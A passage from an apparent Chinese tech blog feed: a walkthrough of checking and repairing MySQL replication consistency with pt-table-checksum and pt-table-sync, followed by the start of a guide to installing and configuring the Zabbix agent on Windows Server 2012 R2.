60</span><br><span class="line">              Master_Log_File: mybinlog.000001</span><br><span class="line">          Read_Master_Log_Pos: 120</span><br><span class="line">               Relay_Log_File: mysql-relay-bin.000002</span><br><span class="line">                Relay_Log_Pos: 282</span><br><span class="line">        Relay_Master_Log_File: mybinlog.000001</span><br><span class="line">             Slave_IO_Running: Yes</span><br><span class="line">            Slave_SQL_Running: Yes</span><br><span class="line">              Replicate_Do_DB: </span><br><span class="line">          Replicate_Ignore_DB: </span><br><span class="line">           Replicate_Do_Table: </span><br><span class="line">       Replicate_Ignore_Table: </span><br><span class="line">      Replicate_Wild_Do_Table: AAA.%</span><br><span class="line">  Replicate_Wild_Ignore_Table: </span><br><span class="line">                   Last_Errno: 0</span><br><span class="line">                   Last_Error: </span><br><span class="line">                 Skip_Counter: 0</span><br><span class="line">          Exec_Master_Log_Pos: 120</span><br><span class="line">              Relay_Log_Space: 455</span><br><span class="line">              Until_Condition: None</span><br><span class="line">               Until_Log_File: </span><br><span class="line">                Until_Log_Pos: 0</span><br><span class="line">           Master_SSL_Allowed: No</span><br><span class="line">           Master_SSL_CA_File: </span><br><span class="line">           Master_SSL_CA_Path: </span><br><span class="line">              Master_SSL_Cert: </span><br><span class="line">            Master_SSL_Cipher: </span><br><span class="line">               Master_SSL_Key: </span><br><span class="line">        Seconds_Behind_Master: 0</span><br><span class="line">Master_SSL_Verify_Server_Cert: No</span><br><span class="line">                Last_IO_Errno: 0</span><br><span class="line">                Last_IO_Error: </span><br><span class="line">               Last_SQL_Errno: 0</span><br><span class="line">               Last_SQL_Error: </span><br><span class="line">  Replicate_Ignore_Server_Ids: </span><br><span class="line">             Master_Server_Id: 503307</span><br><span class="line">                  Master_UUID: 12aaa305-9750-11e7-b2e0-080027eb4c97</span><br><span class="line">             Master_Info_File: mysql.slave_master_info</span><br><span class="line">                    SQL_Delay: 0</span><br><span class="line">          SQL_Remaining_Delay: NULL</span><br><span class="line">      Slave_SQL_Running_State: Slave has read all relay log; waiting for the slave I/O thread to <span class="keyword">update</span> it</span><br><span class="line">           Master_Retry_Count: <span class="number">86400</span></span><br><span class="line">                  Master_Bind: </span><br><span class="line">      Last_IO_Error_Timestamp: </span><br><span class="line">     Last_SQL_Error_Timestamp: </span><br><span class="line">               Master_SSL_Crl: </span><br><span class="line">           Master_SSL_Crlpath: </span><br><span class="line">           Retrieved_Gtid_Set: </span><br><span class="line">            Executed_Gtid_Set: </span><br><span class="line">                Auto_Position: <span class="number">0</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>

<p><strong>插入几条数据后，进行主从数据验证：</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">主库：</span><br><span class="line">mysql&gt; select * from helloa;</span><br><span class="line">+<span class="comment">------+------+</span></span><br><span class="line">| id   | name |</span><br><span class="line">+<span class="comment">------+------+</span></span><br><span class="line">|    1 | jaja |</span><br><span class="line">|    2 | haja |</span><br><span class="line">|    3 | name |</span><br><span class="line">+<span class="comment">------+------+</span></span><br><span class="line">3 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line">从库：</span><br><span class="line">mysql&gt; <span class="keyword">select</span> * <span class="keyword">from</span> helloa;</span><br><span class="line">+<span class="comment">------+------+</span></span><br><span class="line">| id   | name |</span><br><span class="line">+<span class="comment">------+------+</span></span><br><span class="line">|    1 | yuyu |</span><br><span class="line">|    2 | haja |</span><br><span class="line">|    3 | wowo |</span><br><span class="line">|    3 | name |</span><br><span class="line">+<span class="comment">------+------+</span></span><br><span class="line">4 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line">执行pt-<span class="keyword">table</span>-<span class="keyword">checksum</span></span><br><span class="line">[root@<span class="keyword">test</span> ~]<span class="comment"># pt-table-checksum --no-check-binlog-format --no-check-replication-filters --recursion-method='processlist' --create-replicate-table --replicate=AAA.checksum --databases=AAA -h 192.168.18.50 -P 3307 -u checksum -p 123456</span></span><br><span class="line">            TS <span class="keyword">ERRORS</span>  DIFFS     <span class="keyword">ROWS</span>  CHUNKS SKIPPED    <span class="built_in">TIME</span> <span class="keyword">TABLE</span></span><br><span class="line"><span class="number">09</span><span class="number">-18</span>T03:<span class="number">50</span>:<span class="number">29</span>      <span class="number">0</span>      <span class="number">1</span>        <span class="number">3</span>       <span class="number">1</span>       <span class="number">0</span>   <span class="number">0.919</span> AAA.helloa</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">执行sync时报错</span><br><span class="line">[root@test ~]<span class="comment"># pt-table-sync --replicate=AAA.checksum --recursion-method='processlist' --database=AAA --port=3307 h=192.168.18.50,u=checksum,p=123456 --print</span></span><br><span class="line">Can't make changes on the master because no unique index exists at /usr/bin/pt-table-sync line 10663.  while doing AAA.helloa on 192.168.18.60</span><br></pre></td></tr></table></figure>

<p><strong>给helloa增加primary key</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">首先删除从库helloa表上的id的重复数据，然后在主库增加helloa的主键</span><br><span class="line">mysql&gt; alter table helloa add primary key (id);</span><br><span class="line">Query OK, 3 rows affected (0.24 sec)</span><br><span class="line">Records: 3  Duplicates: 0  Warnings: 0</span><br><span class="line">mysql&gt; show index from helloa\G</span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">        Table: helloa</span><br><span class="line">   Non_unique: 0</span><br><span class="line">     Key_name: PRIMARY</span><br><span class="line"> Seq_in_index: 1</span><br><span class="line">  Column_name: id</span><br><span class="line">    Collation: A</span><br><span class="line">  Cardinality: 2</span><br><span class="line">     Sub_part: NULL</span><br><span class="line">       Packed: NULL</span><br><span class="line">         Null: </span><br><span class="line">   Index_type: BTREE</span><br><span class="line">      <span class="keyword">Comment</span>: </span><br><span class="line">Index_comment: </span><br><span class="line"><span class="number">1</span> <span class="keyword">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line">从库：</span><br><span class="line">mysql&gt; <span class="keyword">show</span> <span class="keyword">index</span> <span class="keyword">from</span> helloa \G</span><br><span class="line">*************************** <span class="number">1.</span> <span class="keyword">row</span> ***************************</span><br><span class="line">        <span class="keyword">Table</span>: helloa</span><br><span class="line">   Non_unique: <span class="number">0</span></span><br><span class="line">     Key_name: PRIMARY</span><br><span class="line"> Seq_in_index: <span class="number">1</span></span><br><span class="line">  Column_name: <span class="keyword">id</span></span><br><span class="line">    <span class="keyword">Collation</span>: A</span><br><span class="line">  Cardinality: <span class="number">2</span></span><br><span class="line">     Sub_part: <span class="literal">NULL</span></span><br><span class="line">       Packed: <span class="literal">NULL</span></span><br><span class="line">         <span class="literal">Null</span>: </span><br><span class="line">   Index_type: BTREE</span><br><span class="line">      <span class="keyword">Comment</span>: </span><br><span class="line">Index_comment: </span><br><span class="line"><span class="number">1</span> <span class="keyword">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>

<p><strong>重新做checksum并sync（做同步前最好备份该表）</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">[root@test ~]<span class="comment"># pt-table-checksum --no-check-binlog-format --no-check-replication-filters --recursion-method='processlist' --create-replicate-table --replicate=AAA.checksum --databases=AAA -h 192.168.18.50 -P 3307 -u checksum -p 123456</span></span><br><span class="line">            TS ERRORS  DIFFS     ROWS  CHUNKS SKIPPED    TIME TABLE</span><br><span class="line">09-18T05:42:19      0      1        3       1       0   0.438 AAA.helloa</span><br><span class="line">[root@test ~]<span class="comment"># pt-table-sync --replicate=AAA.checksum --recursion-method='processlist' --database=AAA --port=3307 h=192.168.18.50,u=checksum,p=123456 --print</span></span><br><span class="line"><span class="keyword">REPLACE</span> <span class="keyword">INTO</span> <span class="string">`AAA`</span>.<span class="string">`helloa`</span>(<span class="string">`id`</span>, <span class="string">`name`</span>) <span class="keyword">VALUES</span> (<span class="string">'1'</span>, <span class="string">'jaja'</span>) <span class="comment">/*percona-toolkit src_db:AAA src_tbl:helloa src_dsn:P=3307,h=192.168.18.50,p=...,u=checksum dst_db:AAA dst_tbl:helloa dst_dsn:P=3307,h=192.168.18.60,p=...,u=checksum lock:1 transaction:1 changing_src:AAA.checksum replicate:AAA.checksum bidirectional:0 pid:9609 user:root host:test*/</span>;</span><br><span class="line">[root@test ~]<span class="comment"># pt-table-sync --replicate=AAA.checksum --recursion-method='processlist' --database=AAA --port=3307 h=192.168.18.50,u=checksum,p=123456 --exec</span></span><br></pre></td></tr></table></figure>

<p><strong>检查主从数据库的helloa表，数据一致</strong></p>
<p><strong>非默认端口DSN配置</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">如果主库使用非默认端口，<span class="comment">--recursion-method默认值为hosts，这时如果从库没有配置report_host参数(注意该参数缺点)，则pt-table-checksum无法自动检测到从库。</span></span><br><span class="line">如果主库使用的是默认端口，那么<span class="comment">--recursion-method默认值为processlist，这时pt-table-checksum只能连上端口为3306的从库，无法连接非默认端口的从库</span></span><br><span class="line">所以如果如果主库或者从库使用了非默认端口，建议通过dsn指定从库信息</span><br><span class="line"> </span><br><span class="line">在主库创建dsn表，并插入从库信息</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> percona.<span class="string">`dsns`</span> (</span><br><span class="line"><span class="string">`id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT,</span><br><span class="line"><span class="string">`parent_id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`dsn`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>)</span><br><span class="line">);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> percona.dsns <span class="keyword">select</span> <span class="number">1</span>,<span class="number">1</span>,<span class="string">'h=172.172.178.76,u=checksum,p=root,P=3306'</span>;</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> percona.dsns <span class="keyword">select</span> <span class="number">2</span>,<span class="number">2</span>,<span class="string">'h=172.172.178.77,u=checksum,p=root,P=3307'</span>;</span><br><span class="line"> </span><br><span class="line">pt-table-<span class="keyword">checksum</span> <span class="comment">--nocheck-binlog-format --replicate=percona.checksums --recursion-method=dsn=h=127.0.0.1,D=percona,t=dsns --set-varsinnodb_lock_wait_timeout=120 -uroot -proot -h127.0.0.1 -P3306 --quiet</span></span><br><span class="line"> </span><br><span class="line">           TS <span class="keyword">ERRORS</span>  DIFFS     <span class="keyword">ROWS</span> CHUNKS SKIPPED    <span class="built_in">TIME</span> <span class="keyword">TABLE</span></span><br><span class="line"><span class="number">11</span><span class="number">-18</span>T10:<span class="number">47</span>:<span class="number">25</span>      <span class="number">0</span>     <span class="number">1</span>        <span class="number">3</span>       <span class="number">1</span>      <span class="number">0</span>   <span class="number">0.340</span> test1.test_concat</span><br><span class="line"><span class="comment">##上面的结果中我们只看到某些表主从数据不一致，但是确无法判断到底哪个从库和主库数据不一致。我们可以在pt-table-checksum后，再次指定--replicate-check-only来执行pt-table-checksum，显示具体信息，例如：</span></span><br><span class="line"> </span><br><span class="line">pt-<span class="keyword">table</span>-<span class="keyword">checksum</span> <span class="comment">--nocheck-binlog-format--replicate=percona.checksums --recursion-method=dsn=D=percona,t=dsns--set-vars innodb_lock_wait_timeout=120 -uroot -proot -h127.0.0.1 -P3306--replicate-check-only</span></span><br><span class="line"> </span><br><span class="line">Differences <span class="keyword">on</span> shao76</span><br><span class="line"><span class="keyword">TABLE</span> <span class="keyword">CHUNK</span> CNT_DIFF CRC_DIFF CHUNK_INDEXLOWER_BOUNDARY UPPER_BOUNDARY</span><br><span class="line">test1.test_concat <span class="number">1</span> <span class="number">0</span> <span class="number">1</span>  </span><br><span class="line"> </span><br><span class="line"><span class="number">1.</span>只检查指定的数据库，或者表</span><br><span class="line"><span class="number">1</span>) 只检查指定数据库下所有表</span><br><span class="line">pt-<span class="keyword">table</span>-<span class="keyword">checksum</span> <span class="comment">--nocheck-binlog-format--replicate=percona.checksums --recursion-method=dsn=D=percona,t=dsns--set-vars innodb_lock_wait_timeout=120 -uroot -proot -h127.0.0.1 -P3306--databases=test1,test5 --quiet</span></span><br><span class="line"> </span><br><span class="line"><span class="number">2</span>) 只检查指定表</span><br><span class="line">pt-<span class="keyword">table</span>-<span class="keyword">checksum</span> <span class="comment">--nocheck-binlog-format--replicate=percona.checksums --recursion-method=dsn=D=percona,t=dsns--set-vars innodb_lock_wait_timeout=120 -uroot -proot -h127.0.0.1 -P3306--databases=test1 --tables=test_concat --quiet</span></span><br><span class="line">或者<span class="comment">--tables=database.table</span></span><br><span class="line">pt-<span class="keyword">table</span>-<span class="keyword">checksum</span> <span class="comment">--nocheck-binlog-format--replicate=percona.checksums --recursion-method=dsn=D=percona,t=dsns--set-vars innodb_lock_wait_timeout=120 -uroot -proot -h127.0.0.1 -P3306--tables=test1.test_concat –quiet</span></span><br><span class="line">或者<span class="comment">--tables-regex正则匹配指定表</span></span><br><span class="line">pt-<span class="keyword">table</span>-<span class="keyword">checksum</span> <span class="comment">--nocheck-binlog-format--replicate=percona.checksums --recursion-method=dsn=D=percona,t=dsns--set-vars innodb_lock_wait_timeout=120 -uroot -proot -h127.0.0.1 -P3306--databases=test1 --tables-regex=test_*</span></span><br><span class="line"> </span><br><span class="line"><span class="number">2.</span>检查时忽略指定的数据库，或者表</span><br><span class="line"><span class="comment">--ignore-databases,--ignore-databases-regex,--ignore-tables,--ignore-tables-regex</span></span><br><span class="line"><span class="number">1</span>) 忽略指定数据库</span><br><span class="line">pt-<span class="keyword">table</span>-<span class="keyword">checksum</span> <span class="comment">--nocheck-binlog-format--replicate=percona.checksums --recursion-method=dsn=D=percona,t=dsns--set-vars innodb_lock_wait_timeout=120 -uroot -proot -h127.0.0.1 -P3306--ignore-databases=test5,mysql --quiet</span></span><br><span class="line"><span class="comment">##percona数据库默认被忽略</span></span><br><span class="line"> </span><br><span class="line"><span class="number">2</span>) 忽略指定表</span><br><span class="line">pt-<span class="keyword">table</span>-<span class="keyword">checksum</span> <span class="comment">--nocheck-binlog-format--replicate=percona.checksums --recursion-method=dsn=D=percona,t=dsns--set-vars innodb_lock_wait_timeout=120 -uroot -proot -h127.0.0.1 -P3306  --ignore-tables-regex=test_*</span></span><br><span class="line"><span class="comment">##注意只能忽略所有库下的test_*表，没法指定只忽略某个库下test_*表，而对其他库下的test_*表进行检查</span></span><br><span class="line"> </span><br><span class="line"><span class="number">3.</span>只检查指定表的某些列</span><br><span class="line">pt-<span class="keyword">table</span>-<span class="keyword">checksum</span> <span class="comment">--nocheck-binlog-format--replicate=percona.checksums --recursion-method=dsn=D=percona,t=dsns--set-vars innodb_lock_wait_timeout=120 -uroot -proot -h127.0.0.1 -P3306--databases=test1 --tables=test_concat --columns=id,name –quiet</span></span><br><span class="line"> </span><br><span class="line"><span class="number">4.</span>检查时忽略某些列</span><br><span class="line">pt-<span class="keyword">table</span>-<span class="keyword">checksum</span> <span class="comment">--nocheck-binlog-format--replicate=percona.checksums --recursion-method=dsn=D=percona,t=dsns--set-vars innodb_lock_wait_timeout=120 -uroot -proot -h127.0.0.1 -P3306--databases=test1 --ignore-columns=id --quiet</span></span><br></pre></td></tr></table></figure>

<p><strong>参数介绍：</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1. 连接主从库的参数： </span><br><span class="line"><span class="comment">--host      --socket      --user    --password    --pid     --port</span></span><br><span class="line">2.  确定比较范围的参数</span><br><span class="line">(1) 指定库</span><br><span class="line"><span class="comment">--databases   /   --ignore-databases                       要比较的库   /   比较过程中忽略这些库</span></span><br><span class="line"><span class="comment">--databases-regex   /   --ignore-databases-regex     	   同上，不过可以用正则匹配</span></span><br><span class="line">(2) 指定表</span><br><span class="line"><span class="comment">--tables   /   --ignore-tables                             要比较的表   /   比较过程中忽略这些表</span></span><br><span class="line"><span class="comment">--tables-regex   /   --ignore-tables-regex                 同上，不过可以用正则匹配</span></span><br><span class="line">(3) 指定列</span><br><span class="line"><span class="comment">--columns   /   --ignore-columns                           要比较的列   /   比较过程中忽略这些列</span></span><br><span class="line">(4) 直接指定表范围</span><br><span class="line"><span class="comment">--where                                                    直接指定表中要比较的范围</span></span><br><span class="line">(5) 根据引擎选表</span><br><span class="line"> <span class="comment">--engines   /   --ignore-engines                          比较指定的引擎表   /   比较过程中忽略含有这些引擎的表</span></span><br><span class="line">3.  指定连接中断后行为的参数</span><br><span class="line"><span class="comment">--resume     如果主从一致性检查中途中断的话，可以用这个参数来使工具从上次中断时检查的最后一个表开始继续检查</span></span><br><span class="line"><span class="comment">--retries      如果在检查过程中有非致命性的中断的话，如被kill或者从库延迟等，指定该参数后，工具会自动尝试重连</span></span><br><span class="line">4.  需重点关注的参数</span><br><span class="line">(1)  <span class="comment">--[no]check-binlog-format  </span></span><br><span class="line">      默认会检查binlog-format,如果不是statment，就会报错退出，想避免该检查可以设置<span class="comment">--no-check-binlog-format</span></span><br><span class="line">(2)  <span class="comment">--recursion-method</span></span><br><span class="line">    参数有四：processlist/hosts/dsn=DSN/no，默认是processlist,hosts，但最好还是指定一下，建议指定<span class="comment">--recursion-method=processlist，no一般不使用</span></span><br><span class="line">    dsn=DSN方法使用时，需要先去库里创建一个表，比如在percona库中建一个dnsn表</span><br><span class="line"> </span><br><span class="line">    建表语句是： </span><br><span class="line">    <span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`dsns`</span> (<span class="string">`id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT,<span class="string">`parent_id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,<span class="string">`dsn`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>)); </span><br><span class="line">    建好后插入主从复制信息数据，如：<span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">table</span> dsns(dsn) <span class="keyword">values</span>(h=slave_host,u=repl_user,p=repl_password,P=port );</span><br><span class="line">    然后就可以使用DSN方法了：命令为：<span class="comment">--recursion-method dsn=D=percona,t=dsns.</span></span><br><span class="line">(3)  <span class="comment">--replicate</span></span><br><span class="line">    用来指定存放计算结果的表名， 默认是percona.checksums，工具会默认自动创建库percona和表checksums并将<span class="keyword">checksum</span>的检查结果输入到这个表中，如果自己用该参数去指定表的话，表结构必须是：</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> checksums (</span><br><span class="line">   db             <span class="built_in">char</span>(<span class="number">64</span>)     <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">   tbl            <span class="built_in">char</span>(<span class="number">64</span>)     <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">   <span class="keyword">chunk</span>          <span class="built_in">int</span>          <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">   chunk_time     <span class="built_in">float</span>            <span class="literal">NULL</span>,</span><br><span class="line">   chunk_index    <span class="built_in">varchar</span>(<span class="number">200</span>)     <span class="literal">NULL</span>,</span><br><span class="line">   lower_boundary <span class="built_in">text</span>             <span class="literal">NULL</span>,</span><br><span class="line">   upper_boundary <span class="built_in">text</span>             <span class="literal">NULL</span>,</span><br><span class="line">   this_crc       <span class="built_in">char</span>(<span class="number">40</span>)     <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">   this_cnt       <span class="built_in">int</span>          <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">   master_crc     <span class="built_in">char</span>(<span class="number">40</span>)         <span class="literal">NULL</span>,</span><br><span class="line">   master_cnt     <span class="built_in">int</span>              <span class="literal">NULL</span>,</span><br><span class="line">   ts             <span class="built_in">timestamp</span>    <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">   PRIMARY <span class="keyword">KEY</span> (db, tbl, <span class="keyword">chunk</span>),</span><br><span class="line">   <span class="keyword">INDEX</span> ts_db_tbl (ts, db, tbl)</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span>; </span><br><span class="line"> </span><br><span class="line">需要注意的是存储引擎设置，如果检查的表是innodb表，就设置innodb引擎，如果检查的表和checksums表的引擎不一致，如分别是myisam和innodb，会引起复制错误:“different error on master and slave.”!!!</span><br><span class="line"> </span><br><span class="line">5. 其他部分参数详述：</span><br><span class="line">(1)  <span class="comment">--[no]check-replication-filters</span></span><br><span class="line">     默认在检查到在主从复制过程中有被用..ignore..过滤掉的表，检查会中断并退出，如果想避开这个检查可以设置<span class="comment">--no-check-replication-filters</span></span><br><span class="line">(2)  <span class="comment">--chunk-index（type: string）</span></span><br><span class="line">     工具默认在分块时会选取最合适的索引来<span class="keyword">explain</span>确定<span class="keyword">chunk</span>的大小，但如果你希望用其他索引来执行，可以用该参数来指定，工具会以<span class="keyword">FORCE</span> <span class="keyword">INDEX</span>的形式把指定的索引加进去</span><br><span class="line">(<span class="number">3</span>)  <span class="comment">--chunk-index-columns(type: int)</span></span><br><span class="line">     可以用来指定组合索引中使用前几个列来辅助分块</span><br><span class="line">(<span class="number">4</span>)  <span class="comment">--chunk-size</span></span><br><span class="line">     直接确定<span class="keyword">chunk</span>的大小，默认<span class="number">1000</span>行数据，但不建议使用，建议使用<span class="comment">--chunk-time代替</span></span><br><span class="line">(<span class="number">5</span>)  <span class="comment">--chunk-time</span></span><br><span class="line">     默认是<span class="number">0.5</span>秒，工具会根据当前系统运行繁忙程度计算出在该指定时间内可以处理的数据行数（即<span class="keyword">chunk</span>），比较灵活</span><br><span class="line">(<span class="number">6</span>) <span class="comment">--[no]empty-replicate-table</span></span><br><span class="line">     默认yes，每次检查表之前都去把checksums表中已有的该表信息删掉，以利于后续重新插入新检查信息</span><br><span class="line">(<span class="number">7</span>) <span class="comment">--float-precision(type: int)</span></span><br><span class="line">     设置浮点数的四舍五入方式，以避免不同版本间或其他特定情况中，主从间因浮点数四舍五入的方式不同而导致查出不一致，<span class="keyword">If</span> you specify a <span class="keyword">value</span> <span class="keyword">of</span> <span class="number">2</span>, <span class="keyword">for</span> example, <span class="keyword">then</span> the <span class="keyword">values</span> <span class="number">1.008</span> <span class="keyword">and</span> <span class="number">1.009</span> will be rounded <span class="keyword">to</span> <span class="number">1.01</span>, <span class="keyword">and</span> will <span class="keyword">checksum</span> <span class="keyword">as</span> equal</span><br><span class="line">(<span class="number">8</span>) <span class="comment">--function</span></span><br><span class="line">     计算<span class="keyword">checksum</span>值时的函数，默认是<span class="keyword">CRC32</span>，其他还有FNV1A_64, MURMUR_HASH, <span class="keyword">SHA1</span>, <span class="keyword">MD5</span>等</span><br><span class="line">(<span class="number">9</span>)  <span class="comment">--max-lag</span></span><br><span class="line">    默认<span class="number">1</span>S，主从最大延迟，超过这个延迟时间，就会停下来等待从库同步，确定方法是采用Seconds_Behind_Master的值 </span><br><span class="line">(<span class="number">10</span>) <span class="comment">--progress</span></span><br><span class="line">    指定后可以按设定的参数将执行过程中的运行情况输出到STDERR，如主从延迟时从库的等待，等待时间等，指定时后跟两个参数值，默认是 <span class="string">"time,30"</span>，前一个参数有：percentage, <span class="built_in">time</span>, <span class="keyword">or</span> iterations;后一个指定百分比，具体时间或者间隔的数目</span><br></pre></td></tr></table></figure>

<p>常见问题：<br>1.Diffs cannot be detected because no slaves were found不能自动找到从库，确认processlist或host或dsns方式用对了。<br>2.Cannot connect to h=slave1.*.com,p=…,u=percona_user可以在pt-table-checksum命令前加PTDEBUG=1来看详细的执行过程，如端口、用户名、权限错误。<br>3.Waiting for the –replicate table to replicate to XXX.问题出在 percona.checksums 表在从库不存在，根本原因是没有从主库同步过来，所以看一下从库是否延迟严重。<br>4.Pausing because Threads_running=25,反复打印出类似上面停止检查的信息。这是因为当前数据库正在运行的线程数大于默认25，pt-table-checksum 为了减少对库的压力暂停检查了。等数据库压力过了就好了，或者也可以直接 Ctrl+C 终端，下一次加上–resume继续执行，或者加大–max-load=值.</p>
]]></content>
      <categories>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title>zabbix_agentd客户端安装与配置（windows server 2012 R2）</title>
    <url>/2020/09/10/windows%20zabbix%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="zabbix-agentd客户端安装与配置（windows-server-2012-R2）"><a href="#zabbix-agentd客户端安装与配置（windows-server-2012-R2）" class="headerlink" title="zabbix_agentd客户端安装与配置（windows server 2012 R2）"></a>zabbix_agentd客户端安装与配置（windows server 2012 R2）</h2><p>所用到的软件链接如下</p>
<p>链接：<a href="https://pan.baidu.com/s/1YdyEDMqR2xaO_BDRlr-ffA" target="_blank" rel="noopener">https://pan.baidu.com/s/1YdyEDMqR2xaO_BDRlr-ffA</a><br>提取码：0cm9</p>
<p>64位的系统</p>
<p>首先下载zabbix的windows客户端（zabbix官网有，你看你的server是哪个版本的就下载哪个版本的客户端，此处需要提醒，在zabbix官网，你可能找不到服务端对应的客户端，和我现在这个情况一样，我查阅了很多资料，了解到zabbix高版本的server端能够兼容低版本的agent端，因为我server端用的是3.4，所以我agent端用的是3.0的。）</p>
<h4 id="一、设置防火墙规则（如果你的防火墙是开着的）"><a href="#一、设置防火墙规则（如果你的防火墙是开着的）" class="headerlink" title="一、设置防火墙规则（如果你的防火墙是开着的）"></a>一、设置防火墙规则（如果你的防火墙是开着的）</h4><p>此处略，如果不清楚，请先查看“windows server 2012 R2 安全防护”，这个文档中有防火墙操作指南。</p>
<h4 id="二、解压安装包"><a href="#二、解压安装包" class="headerlink" title="二、解压安装包"></a>二、解压安装包</h4><p>zabbix_agent-3.0.31-windows-amd64.zip    </p>
<p>#我的zabbix服务器版本是3.4.2的所以下载的是这个（高版本server兼容低版本agent）</p>
<p>解压后会生成俩个文件夹，bin和conf</p>
<p>在E盘下新建一个zabbix目录，并将zabbix_agent-3.0.31-windows-amd64.zip解压出来的bin目录和conf目录copy到zabbix目录下</p>
<p>这里建议先将zabbix_agent-3.0.31-windows-amd64.zip在自己电脑上解压出来后，修改对应的配置文件，修改完成之后再将这两个目录传到远程服务器上。因为远程服务器上只能用记事本打开配置文件，记事本打开文件的排版对阅读非常不友好。</p>
<h4 id="三、编辑配置文件"><a href="#三、编辑配置文件" class="headerlink" title="三、编辑配置文件"></a>三、编辑配置文件</h4><p>zabbix_agentd.conf文件，有Sublime Text就用它打开，没有就用其他工具打开</p>
<p>修改下面几项：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">EnableRemoteCommands&#x3D;1			#允许在本地执行远程命令</span><br><span class="line"></span><br><span class="line">LogRemoteCommands&#x3D;1				#执行远程命令是否保存操作日志</span><br><span class="line"></span><br><span class="line">Server &#x3D; 192.168.1.2          	#填写zabbix服务器IP地址</span><br><span class="line"></span><br><span class="line">Hostname&#x3D;test_server			#zabbix_agent客户端计算机名 (被监控主机)</span><br><span class="line"></span><br><span class="line">**LogFile&#x3D;c:\zabbix\zabbix_agentd.log**  #日志文件，默认是在C盘下的，可以把它放在zabbix文件夹中</span><br></pre></td></tr></table></figure>

<h4 id="四、启动"><a href="#四、启动" class="headerlink" title="四、启动"></a>四、启动</h4><p>在DOS命令窗输入以下内容：</p>
<p><strong>E:\zabbix\zabbix_agentd.exe -i -c E:\zabbix\zabbix_agentd.conf</strong>   #安装zabbix客户端</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/10/windows%20zabbix%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE/image-20200910142206408.png" alt="image-20200910142206408"></p>
<p>下面这一步可以直接通过命令启动，如果不行，在远程服务器上按下“win+r”呼出运行框，输入“services.msc”，然后找到对应的服务，右键选择启动即可</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/10/windows%20zabbix%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE/image-20200910150705614.png" alt="image-20200910150705614"></p>
<p><img src= "/img/loading.gif" data-src="/2020/09/10/windows%20zabbix%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE/image-20200910150715456.png" alt="image-20200910150715456"></p>
<p>E:\zabbix\zabbix_agentd.exe -s -c E:\zabbix\zabbix_agentd.conf   #启动zabbix服务</p>
<h4 id="五、在zabbix的web界面新增监控"><a href="#五、在zabbix的web界面新增监控" class="headerlink" title="五、在zabbix的web界面新增监控"></a>五、在zabbix的web界面新增监控</h4><p>首先添加模板Template-OS-Windows-Newly.xml</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/10/windows%20zabbix%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE/image-20200910151222280.png" alt="image-20200910151222280"></p>
